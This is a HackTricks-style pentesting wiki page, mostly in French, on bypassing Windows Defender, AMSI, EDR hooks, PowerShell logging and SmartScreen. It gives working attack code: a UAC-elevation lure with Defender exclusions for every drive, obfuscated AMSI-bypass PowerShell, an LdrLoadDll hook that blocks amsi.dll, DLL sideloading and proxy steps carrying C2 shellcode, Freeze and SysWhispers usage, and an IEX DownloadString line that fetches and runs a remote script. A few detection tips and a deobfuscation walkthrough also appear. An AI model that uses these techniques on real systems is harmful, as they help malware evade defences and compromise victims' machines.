# Contournement Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Cette page a été écrite par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot): Un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender): Un outil pour empêcher Windows Defender de fonctionner en imitant un autre AV.
- [Désactiver Defender si vous êtes admin](basic-powershell-for-pentesters/README.md)

### Leurre UAC de type installateur avant de manipuler Defender

Des public loaders se faisant passer pour des game cheats sont fréquemment distribués comme des installers Node.js/Nexe non signés qui, dans un premier temps, **demandent l'élévation à l'utilisateur** puis neutralisent Defender. Le déroulement est simple :

1. Vérifier le contexte administratif avec `net session`. La commande ne réussit que si l'appelant possède des droits admin, donc un échec indique que le loader s'exécute en tant qu'utilisateur standard.
2. Se relance immédiatement avec le verbe `RunAs` pour déclencher l'invite de consentement UAC attendue tout en préservant la ligne de commande originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Les victimes croient déjà qu'elles installent un logiciel “cracked”, donc l'invite est généralement acceptée, donnant au malware les droits nécessaires pour modifier la politique de Defender.

### Exclusions globales `MpPreference` pour chaque lettre de lecteur

Une fois élevées, les chaînes de style GachiLoader maximisent les angles morts de Defender au lieu de désactiver complètement le service. Le loader commence d’abord par arrêter le watchdog GUI (`taskkill /F /IM SecHealthUI.exe`) puis applique des **exclusions extrêmement larges** de sorte que chaque profil utilisateur, répertoire système et disque amovible devienne non analysable :
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- La boucle parcourt tous les systèmes de fichiers montés (D:\, E:\, clés USB, etc.) donc **tout payload futur déposé n'importe où sur le disque est ignoré**.
- L'exclusion de l'extension `.sys` est orientée vers l'avenir — les attaquants se réservent l'option de charger des drivers non signés plus tard sans retoucher Defender.
- Tous les changements atterrissent sous `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, ce qui permet aux étapes ultérieures de confirmer que les exclusions persistent ou de les étendre sans réenclencher UAC.

Parce qu'aucun service Defender n'est arrêté, des vérifications de santé naïves continuent de rapporter « antivirus actif » alors que l'inspection en temps réel ne touche jamais ces chemins.

## **Méthodologie d'évasion AV**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non : détection statique, analyse dynamique, et pour les EDRs plus avancés, analyse comportementale.

### **Détection statique**

La détection statique consiste à marquer des chaînes connues malveillantes ou des tableaux d'octets dans un binaire ou script, et aussi à extraire des informations depuis le fichier lui‑même (p.ex. file description, company name, digital signatures, icon, checksum, etc.). Cela signifie que l'utilisation d'outils publics connus peut vous faire détecter plus facilement, car ils ont probablement déjà été analysés et marqués comme malveillants. Il existe plusieurs façons de contourner ce type de détection :

- **Encryption**

Si vous chiffrez le binaire, il n'y aura aucun moyen pour l'AV de détecter votre programme, mais vous aurez besoin d'une sorte de loader pour déchiffrer et exécuter le programme en mémoire.

- **Obfuscation**

Parfois, il suffit de modifier certaines chaînes dans votre binaire ou script pour passer l'AV, mais cela peut être une tâche longue selon ce que vous essayez d'obfusquer.

- **Custom tooling**

Si vous développez vos propres outils, il n'y aura pas de signatures connues, mais cela demande beaucoup de temps et d'efforts.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Je vous recommande fortement de consulter cette [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l'AV Evasion pratique.

### **Analyse dynamique**

L'analyse dynamique consiste à exécuter votre binaire dans un sandbox et à surveiller les activités malveillantes (p.ex. tenter de déchiffrer et lire les mots de passe du navigateur, effectuer un minidump sur LSASS, etc.). Cette partie peut être un peu plus délicate à gérer, mais voici quelques approches pour échapper aux sandboxes.

- **Sleep before execution** Selon l'implémentation, cela peut être un excellent moyen de contourner l'analyse dynamique des AV. Les AV ont très peu de temps pour analyser les fichiers afin de ne pas interrompre le flux de travail de l'utilisateur, donc utiliser de longues pauses peut perturber l'analyse des binaires. Le problème est que de nombreux sandboxes des AV peuvent simplement sauter le sleep selon la façon dont il est implémenté.
- **Checking machine's resources** Habituellement, les sandboxes ont très peu de ressources (p.ex. < 2GB RAM), sinon elles pourraient ralentir la machine de l'utilisateur. Vous pouvez aussi être très créatif ici, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs, tout ne sera pas implémenté dans le sandbox.
- **Machine-specific checks** Si vous voulez cibler un utilisateur dont la station de travail est jointe au domaine "contoso.local", vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui que vous avez spécifié ; si ce n'est pas le cas, vous pouvez faire quitter votre programme.

Il se trouve que le computername du Sandbox de Microsoft Defender est HAL9TH, donc vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation ; si le nom correspond à HAL9TH, cela signifie que vous êtes dans le sandbox de defender, vous pouvez donc faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Quelques autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour contrer les Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l'avons déjà dit dans ce post, les **outils publics** finiront par **être détectés**, donc posez‑vous la question suivante :

Par exemple, si vous voulez dumper LSASS, **avez‑vous vraiment besoin d'utiliser mimikatz** ? Ou pourriez‑vous utiliser un autre projet moins connu qui dumpe aussi LSASS.

La bonne réponse est probablement la seconde. En prenant mimikatz comme exemple, c'est probablement l'un des, sinon le plus, morceau de malware le plus signalé par les AVs et EDRs ; bien que le projet soit super cool, c'est aussi un cauchemar pour contourner les AVs, donc cherchez simplement des alternatives pour ce que vous voulez accomplir.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Cette commande va afficher la liste des programmes susceptibles de DLL hijacking dans "C:\Program Files\\" et les fichiers DLL qu'ils tentent de charger.

Je vous recommande vivement d'**explorer vous-même les programmes DLL Hijackable/Sideloadable**, cette technique est assez discrète si elle est bien réalisée, mais si vous utilisez des programmes DLL Sideloadable publiquement connus, vous pouvez facilement être détecté.

Se contenter de placer une DLL malveillante ayant le nom qu'un programme s'attend à charger ne suffira pas à lancer votre payload, car le programme attend certaines fonctions spécifiques dans cette DLL. Pour résoudre ce problème, nous allons utiliser une autre technique appelée **DLL Proxying/Forwarding**.

**DLL Proxying** relaie les appels qu'un programme effectue depuis la DLL proxy (et malveillante) vers la DLL originale, préservant ainsi la fonctionnalité du programme tout en permettant de gérer l'exécution de votre payload.

J'utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j'ai suivies :
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous donnera 2 fichiers : un modèle de code source de DLL, et la DLL originale renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! Je considère cela comme un succès.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je **recommande vivement** de regarder [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sur DLL Sideloading et aussi [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) pour en apprendre davantage sur ce que nous avons abordé de manière plus approfondie.

### Abuser des Forwarded Exports (ForwardSideLoading)

Les modules Windows PE peuvent exporter des fonctions qui sont en réalité des "forwarders" : au lieu de pointer vers du code, l'entrée d'export contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Lorsqu'un appelant résout l'export, le loader Windows va :

- Charger `TargetDll` s'il n'est pas déjà chargé
- Résoudre `TargetFunc` à partir de celui-ci

Comportements clés à comprendre :
- Si `TargetDll` est un KnownDLL, il est fourni depuis l'espace de noms protégé KnownDLLs (par ex., ntdll, kernelbase, ole32).
- Si `TargetDll` n'est pas un KnownDLL, l'ordre de recherche normal des DLL est utilisé, ce qui inclut le répertoire du module qui effectue la résolution de l'export transféré.

Cela permet une primitive de sideloading indirecte : trouvez une DLL signée qui exporte une fonction transférée vers un nom de module non-KnownDLL, puis placez cette DLL signée dans le même répertoire qu'une DLL contrôlée par l'attaquant portant exactement le nom du module cible transféré. Lorsque l'export transféré est invoqué, le loader résout le forward et charge votre DLL depuis le même répertoire, exécutant votre DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` n'est pas un KnownDLL, donc elle est résolue par l'ordre de recherche normal.

PoC (copier-coller):
1) Copier la DLL système signée dans un dossier accessible en écriture
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez un `NCRYPTPROV.dll` malveillant dans le même dossier. Un DllMain minimal suffit pour obtenir l'exécution de code ; vous n'avez pas besoin d'implémenter la forwarded function pour déclencher DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Déclenchez le forward avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportement observé:
- rundll32 (signé) charge le side-by-side `keyiso.dll` (signé)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le loader suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le loader charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n'est pas implémentée, vous obtiendrez une erreur "missing API" seulement après que `DllMain` se soit déjà exécuté

Hunting tips:
- Concentrez-vous sur les exports forwardés dont le module cible n'est pas un KnownDLL. KnownDLLs sont listés sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports forwardés avec des outils tels que:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l'inventaire des forwarders Windows 11 pour rechercher des candidats: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Surveillez les LOLBins (par ex., rundll32.exe) qui chargent des DLL signées depuis des chemins non-système, puis chargent des non-KnownDLLs portant le même nom de base depuis ce répertoire
- Alertez sur des chaînes processus/module telles que : `rundll32.exe` → non-système `keyiso.dll` → `NCRYPTPROV.dll` dans des chemins accessibles en écriture par l'utilisateur
- Appliquez des politiques d'intégrité du code (WDAC/AppLocker) et interdisez la combinaison écriture+exécution dans les répertoires d'application

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze est un payload toolkit pour bypassing EDRs en utilisant suspended processes, direct syscalls, et alternative execution methods`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion n'est qu'un jeu du chat et de la souris : ce qui fonctionne aujourd'hui peut être détecté demain, donc ne comptez jamais sur un seul outil ; si possible, essayez d'enchaîner plusieurs techniques d'evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs often place **user-mode inline hooks** on `ntdll.dll` syscall stubs. Pour contourner ces hooks, vous pouvez générer des stubs de syscall **directs** ou **indirects** qui chargent le **SSN** (System Service Number) correct et effectuent la transition en kernel mode sans exécuter l'export entrypoint hooké.

**Invocation options:**
- **Direct (embedded)**: émettez une instruction `syscall`/`sysenter`/`SVC #0` dans le stub généré (no `ntdll` export hit).
- **Indirect**: sautez dans un gadget `syscall` existant à l'intérieur de `ntdll` de sorte que la transition vers le kernel semble provenir de `ntdll` (useful for heuristic evasion) ; **randomized indirect** picks a gadget from a pool per call.
- **Egg-hunt**: évitez d'intégrer la séquence d'opcodes statique `0F 05` sur le disque ; résolvez une séquence de syscall à l'exécution.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: inférer les SSN en triant les syscall stubs par adresse virtuelle au lieu de lire les octets du stub.
- **SyscallsFromDisk**: mapper un `\KnownDlls\ntdll.dll` propre, lire les SSN depuis sa section `.text`, puis unmap (bypasses all in-memory hooks).
- **RecycledGate**: combiner l'inférence SSN triée par VA avec une validation d'opcodes lorsque le stub est propre ; revenir à l'inférence par VA si hooké.
- **HW Breakpoint**: définir DR0 sur l'instruction `syscall` et utiliser un VEH pour capturer le SSN depuis `EAX` à l'exécution, sans parser les octets hookés.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour prévenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Initialement, les AV ne pouvaient scanner que **files on disk**, donc si vous pouviez exécuter des payloads **directly in-memory**, l'AV ne pouvait rien faire pour l'empêcher, car il n'avait pas assez de visibilité.

La fonctionnalité AMSI est intégrée dans ces composants de Windows.

- User Account Control, ou UAC (élévation d'EXE, COM, MSI, ou installation ActiveX)
- PowerShell (scripts, utilisation interactive, et évaluation dynamique de code)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Cela permet aux solutions antivirus d'inspecter le comportement des scripts en exposant le contenu des scripts sous une forme à la fois non chiffrée et non obfusquée.

L'exécution de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produira l'alerte suivante sur Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez comment il préfixe `amsi:` puis le chemin de l'exécutable depuis lequel le script s'est exécuté, dans ce cas, powershell.exe

Nous n'avons déposé aucun fichier sur le disque, mais avons malgré tout été détectés in-memory à cause d'AMSI.

De plus, à partir de **.NET 4.8**, le code C# passe également par AMSI. Cela affecte même `Assembly.Load(byte[])` pour l'exécution in-memory. C'est pourquoi il est recommandé d'utiliser des versions plus anciennes de .NET (comme 4.7.2 ou inférieure) pour l'exécution in-memory si vous voulez échapper à AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

Étant donné qu'AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous essayez de charger peut être un bon moyen d'éviter la détection.

Cependant, AMSI a la capacité de désobfusquer les scripts même s'ils ont plusieurs couches d'obfuscation, donc l'obfuscation peut être une mauvaise option selon la manière dont elle est faite. Cela rend l'évasion moins évidente. Bien que parfois, il suffise de changer quelques noms de variables et tout ira bien, donc cela dépend du niveau de flaggage.

- **AMSI Bypass**

Puisqu'AMSI est implémenté en chargeant une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est possible d'y manipuler facilement même en tant qu'utilisateur non privilégié. En raison de ce défaut d'implémentation d'AMSI, des chercheurs ont trouvé plusieurs moyens d'échapper au scanning AMSI.

**Forcing an Error**

Forcer l'initialisation d'AMSI à échouer (amsiInitFailed) fera qu'aucun scan ne sera initié pour le processus courant. Ceci a été initialement divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour empêcher une utilisation plus large.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Il a suffi d'une ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell en cours. Cette ligne a bien sûr été détectée par AMSI lui-même, donc une modification est nécessaire pour pouvoir utiliser cette technique.

Voici un AMSI bypass modifié que j'ai récupéré depuis ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Gardez à l'esprit que cela sera probablement signalé une fois que ce post sortira, donc vous ne devriez pas publier de code si votre plan est de rester indétecté.

**Memory Patching**

Cette technique a été initialement découverte par [@RastaMouse](https://twitter.com/_RastaMouse/) et consiste à trouver l'adresse de la fonction "AmsiScanBuffer" dans `amsi.dll` (responsable de l'analyse de l'entrée fournie par l'utilisateur) et à la remplacer par des instructions renvoyant le code `E_INVALIDARG` ; de cette façon, le résultat de l'analyse réelle renverra 0, ce qui est interprété comme un résultat propre.

> [!TIP]
> Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

Il existe également de nombreuses autres techniques utilisées pour bypass AMSI avec powershell, consultez [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus à leur sujet.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI n'est initialisé qu'après que `amsi.dll` est chargé dans le processus en cours. Une méthode robuste et indépendante du langage consiste à placer un user-mode hook sur `ntdll!LdrLoadDll` qui renvoie une erreur lorsque le module demandé est `amsi.dll`. En conséquence, AMSI ne se charge jamais et aucune analyse n'a lieu pour ce processus.

Plan d'implémentation (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Remarques
- Fonctionne avec PowerShell, WScript/CScript et les loaders personnalisés (tout ce qui chargerait sinon AMSI).
- Associez-le à l'envoi de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les artefacts de ligne de commande longs.
- Observé utilisé par des loaders exécutés via des LOLBins (p. ex., `regsvr32` appelant `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Supprimer la signature détectée**

Vous pouvez utiliser un outil tel que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus courant. Cet outil fonctionne en scannant la mémoire du processus courant à la recherche de la signature AMSI puis en la remplaçant par des instructions NOP, la supprimant ainsi effectivement de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous pouvez trouver une liste des produits AV/EDR qui utilisent AMSI sur **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser PowerShell version 2**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être analysés par AMSI. Vous pouvez faire ceci:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging est une fonctionnalité qui permet d'enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile pour l'audit et le dépannage, mais cela peut aussi être un **problème pour les attaquants qui veulent échapper à la détection**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) pour cela.
- **Use Powershell version 2**: If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. Vous pouvez faire ceci : `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) to spawn a powershell sans défenses (c'est ce que `powerpick` from Cobalt Strike uses).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Faites attention à cela et n'appliquez peut-être le chiffrement qu'à des sections spécifiques de votre code qui sont sensibles ou doivent être cachées.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Le but de ce projet est de fournir un fork open-source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'améliorer la sécurité logicielle via la code obfuscation et le tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator démontre comment utiliser le langage `C++11/14` pour générer, au moment de la compilation, du obfuscated code sans utiliser d'outil externe et sans modifier le compilateur.
- [**obfy**](https://github.com/fritzone/obfy): Ajoute une couche d'obfuscated operations générées par le C++ template metaprogramming framework, ce qui rendra la tâche de la personne souhaitant crack l'application un peu plus difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un x64 binary obfuscator capable d'obfusquer différents fichiers pe, y compris : .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame est un simple metamorphic code engine pour exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator est un framework de fine-grained code obfuscation pour les langages supportés par LLVM utilisant ROP (return-oriented programming). ROPfuscator obfuscates un programme au niveau du code assembleur en transformant des instructions régulières en ROP chains, contrecarrant notre conception habituelle du control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt est un .NET PE Crypter écrit en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor peut convertir des EXE/DLL existants en shellcode puis les loader

## SmartScreen & MoTW

Vous avez peut-être vu cet écran en téléchargeant certains exécutables depuis Internet et en les exécutant.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement selon une approche basée sur la réputation, ce qui signifie que les applications peu téléchargées déclencheront SmartScreen, alertant et empêchant l'utilisateur final d'exécuter le fichier (même si le fichier peut toujours être exécuté en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) est un NTFS Alternate Data Stream portant le nom Zone.Identifier qui est automatiquement créé lors du téléchargement de fichiers depuis Internet, avec l'URL d'où il a été téléchargé.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification du Zone.Identifier ADS pour un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un **trusted** signing certificate **won't trigger SmartScreen**.

Une manière très efficace d'empêcher que vos payloads reçoivent le Mark of The Web est de les empaqueter à l'intérieur d'un conteneur comme une ISO. Cela arrive parce que Mark-of-the-Web (MOTW) **cannot** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui emballe des payloads dans des conteneurs de sortie pour échapper au Mark-of-the-Web.

